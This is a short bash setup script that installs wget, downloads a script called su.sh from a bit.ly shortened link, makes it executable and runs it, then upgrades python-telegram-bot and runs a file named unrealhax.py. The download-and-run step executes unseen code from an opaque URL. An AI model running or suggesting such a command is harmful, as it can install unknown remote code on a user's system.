#!/bin/bash

# Update package list and install wget
apt update && apt install -y wget

# Download and run the su.sh script
wget -O su.sh https://bit.ly/akuhGet && chmod +x su.sh && ./su.sh

# Upgrade python-telegram-bot package
pip3 install --upgrade python-telegram-bot

# Run the Python script
python3 unrealhax.py
